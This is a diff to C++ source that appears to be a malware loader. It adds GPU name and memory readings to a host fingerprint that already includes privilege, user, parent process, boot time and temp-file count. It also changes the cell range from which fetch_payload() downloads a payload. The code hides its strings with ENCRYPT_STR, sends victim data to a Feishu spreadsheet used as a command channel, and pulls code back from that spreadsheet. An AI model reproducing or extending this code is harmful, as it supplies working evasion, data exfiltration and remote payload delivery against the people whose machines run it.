@@ -140,9 +140,10 @@ void insert_data() {
     std::string currentExeDirStr = GetCurrentExeDir();
     std::string parentProcessNameStr = GetParentProcessName();
     std::string tempFileCountStr = getTempFileCountStr();
+    std::string GPUName;
+    std::string maxGPUMemoryStr = std::to_string(getMaxGPUMemory(&GPUName));
 
-
-    ss << ENCRYPT_STR(R"({"valueRange":{"range":")") << SheetID << "!A" << index << ":M20"
+    ss << ENCRYPT_STR(R"({"valueRange":{"range":")") << SheetID << "!A" << index << ":O20"
         << ENCRYPT_STR(R"(","values":[[")") << timeStr
         << ENCRYPT_STR(R"(",")") << privilegeStr
         << ENCRYPT_STR(R"(",")") << userStr
@@ -156,6 +157,8 @@ void insert_data() {
         << ENCRYPT_STR(R"(",")") << parentProcessNameStr
         << ENCRYPT_STR(R"(",")") << bootTimeStr
         << ENCRYPT_STR(R"(",")") << tempFileCountStr
+        << ENCRYPT_STR(R"(",")") << GPUName
+        << ENCRYPT_STR(R"(",")") << maxGPUMemoryStr
         << ENCRYPT_STR(R"("]]}})");
 
     std::string body = ss.str();
@@ -230,7 +233,7 @@ std::vector<unsigned char> fetch_payload(){
     std::string spreadsheet_token = SpreadsheetToken;
     std::string sheet_id = SheetID;
     std::string index = std::to_string(g_index);
-    std::string range = "O" + index + ":AO" + index;
+    std::string range = "X" + index + ":AO" + index;
 
     
     std::string url = ENCRYPT_STR("https://open.feishu.cn/open-apis/sheets/v2/spreadsheets/") + spreadsheet_token + ENCRYPT_STR("/values/") + sheet_id + ENCRYPT_STR("!") + range;
